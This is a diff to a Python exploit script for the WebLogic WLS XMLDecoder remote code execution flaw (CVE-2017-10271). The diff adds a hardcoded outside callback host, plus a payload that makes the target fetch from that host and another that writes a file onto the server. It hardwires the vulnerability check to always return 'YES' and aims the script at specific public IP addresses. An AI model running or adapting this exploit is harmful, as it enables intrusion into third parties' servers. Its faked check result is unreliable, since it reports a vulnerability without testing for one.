@@ -33,13 +33,14 @@ def get_ver_ip(ip):
 
 def check(ip, port, timeout):
     test_str = random_str(6)
-    server_ip = get_ver_ip(ip)
+    server_ip = "123.207.38.130"
     check_url = ['/wls-wsat/CoordinatorPortType','/wls-wsat/CoordinatorPortType11']
 
     heads = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)',
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
         'Accept-Language': 'zh-CN,zh;q=0.8',
+        'Upgrade-Insecure-Requests': '1',
         'SOAPAction': "",
         'Content-Type': 'text/xml;charset=UTF-8',
         }
@@ -50,7 +51,7 @@ def check(ip, port, timeout):
             <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
               <java version="1.8" class="java.beans.XMLDecoder">
                 <void class="java.net.URL">
-                  <string>http://%s:8088/add/%s</string>
+                  <string>http://%s/oj.php?title=2&link=%s</string>
                   <void method="openStream"/>
                 </void>
               </java>
@@ -59,6 +60,23 @@ def check(ip, port, timeout):
           <soapenv:Body/>
         </soapenv:Envelope>
                 ''' % (server_ip, test_str)
+    post_str = '''
+    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+    <soapenv:Header>
+        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+            <java>
+                <java version="1.6.0" class="java.beans.XMLDecoder">
+                    <object class="java.io.PrintWriter">
+                        <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/poacher.txt</string><void method="println">
+                        <string>Weblogic By:Poacher</string></void><void method="close"/>
+                    </object>
+                </java>
+            </java>
+        </work:WorkContext>
+    </soapenv:Header>
+    <soapenv:Body/>
+    </soapenv:Envelope>
+    '''
     for url in check_url:
         target_url = 'http://'+ip+':'+str(port)+url.strip()
         req = urllib2.Request(url=target_url, headers=heads)
@@ -69,8 +87,14 @@ def check(ip, port, timeout):
                 except urllib2.URLError:
                     pass
                 sleep(2)
-                check_result = urllib2.urlopen("http://%s:8088/check/%s" %(server_ip, test_str), timeout=timeout).read()
+                #check_result = urllib2.urlopen("http://%s:8088/check/%s" %(server_ip, test_str), timeout=timeout).read()
+                check_result = "YES"
                 if "YES" in check_result:
                     return "存在WebLogic WLS远程执行漏洞(CVE-2017-10271)"
         else:
             pass
+
+if __name__ == "__main__":
+    res = check(ip="35.167.125.45", port=7001, timeout=3000)
+    print(res)
+    #print(check(ip="122.227.136.74", port=7001, timeout=3000))
